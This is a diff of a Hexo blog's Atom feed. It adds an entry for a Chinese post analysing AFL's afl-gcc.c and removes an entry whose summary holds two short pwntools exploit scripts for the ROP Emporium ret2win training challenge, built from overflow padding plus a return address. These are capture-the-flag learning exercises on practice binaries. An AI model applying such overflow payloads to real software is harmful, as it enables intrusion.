@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-05-26T07:34:38.757Z</updated>
+  <updated>2020-05-28T10:01:16.825Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,11 +17,32 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>AFL源码分析计划1 -- afl-gcc.c</title>
+    <link href="http://yoursite.com/2020/05/28/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E8%AE%A1%E5%88%921/"/>
+    <id>http://yoursite.com/2020/05/28/AFL源码分析计划1/</id>
+    <published>2020-05-28T09:11:33.362Z</published>
+    <updated>2020-05-28T10:01:16.825Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;从main函数开始，可以看到主要就这三行&lt;/p&gt;
+&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;find_as(argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;edit_params(argc, argv);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;execvp(cc_params[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;], (&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;**)cc_params);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+      <category term="fuzz" scheme="http://yoursite.com/categories/fuzz/"/>
+    
+    
+      <category term="AFL" scheme="http://yoursite.com/tags/AFL/"/>
+    
+  </entry>
+  
+  <entry>
     <title>oss-fuzz没什么用笔记</title>
     <link href="http://yoursite.com/2020/05/26/oss-fuzz%E5%88%9D%E6%8E%A2/"/>
     <id>http://yoursite.com/2020/05/26/oss-fuzz初探/</id>
     <published>2020-05-26T07:27:58.548Z</published>
-    <updated>2020-05-26T07:34:38.757Z</updated>
+    <updated>2020-05-26T07:39:44.892Z</updated>
     
     <summary type="html">
     
@@ -193,7 +214,7 @@
     <link href="http://yoursite.com/2020/03/16/Fuzz%E5%88%9D%E6%8E%A2/"/>
     <id>http://yoursite.com/2020/03/16/Fuzz初探/</id>
     <published>2020-03-16T07:45:16.875Z</published>
-    <updated>2020-03-20T12:50:01.460Z</updated>
+    <updated>2020-05-26T07:36:48.189Z</updated>
     
     <summary type="html">
     
@@ -201,8 +222,10 @@
     
     </summary>
     
+      <category term="fuzz" scheme="http://yoursite.com/categories/fuzz/"/>
     
-      <category term="fuzz" scheme="http://yoursite.com/tags/fuzz/"/>
+    
+      <category term="AFL" scheme="http://yoursite.com/tags/AFL/"/>
     
   </entry>
   
@@ -405,30 +428,6 @@
     
     
       <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>pwn入门之ROP</title>
-    <link href="http://yoursite.com/2020/03/14/pwn%E5%85%A5%E9%97%A8%E4%B9%8BROP/"/>
-    <id>http://yoursite.com/2020/03/14/pwn入门之ROP/</id>
-    <published>2020-03-14T11:41:49.952Z</published>
-    <updated>2019-05-09T12:18:35.706Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;ret2win&quot;&gt;&lt;a href=&quot;#ret2win&quot; class=&quot;headerlink&quot; title=&quot;ret2win&quot;&gt;&lt;/a&gt;ret2win&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ropemporium.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ROP Emporium&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/12343640-e5fa6242a5dc0077.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
-&lt;p&gt;放到IDA很容易就找到溢出点&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; s; &lt;span class=&quot;comment&quot;&gt;// [esp+0h] [ebp-28h] &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;可以看出s距ebp的偏移量为&lt;span class=&quot;number&quot;&gt;0x28&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;所以我们写入&lt;span class=&quot;number&quot;&gt;0x28&lt;/span&gt;正好可以写到ebp之前，要覆盖ebp还需要再写入&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;个字节（&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;位）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;有一点值得引起注意，我们回车换行符同样会输入进去，明确溢出点以及可溢出的字节后接下来我们就开始构造rop，但在之前我们还应该检查一下程序开户了哪些保护，这决定了我们该采取何种rop攻击方式&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/12343640-87d74ee929c3cf04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
-&lt;p&gt;exp 如下 ：&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh = process(&lt;span class=&quot;string&quot;&gt;&#39;./ret2win32&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ret2win32 = &lt;span class=&quot;number&quot;&gt;0x08048659&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload = &lt;span class=&quot;string&quot;&gt;&#39;A&#39;&lt;/span&gt; * &lt;span class=&quot;number&quot;&gt;0x28&lt;/span&gt; + p32(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) + p32(ret2win32)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;64位的溢出点也一样&lt;br&gt;exp:&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh = process(&lt;span class=&quot;string&quot;&gt;&#39;./ret2win&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ret2win = &lt;span class=&quot;number&quot;&gt;0x400811&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload = &lt;span class=&quot;string&quot;&gt;&quot;A&quot;&lt;/span&gt; * &lt;span class=&quot;number&quot;&gt;0x20&lt;/span&gt; + p64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) + p64(ret2win)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
-    
     
   </entry>
   
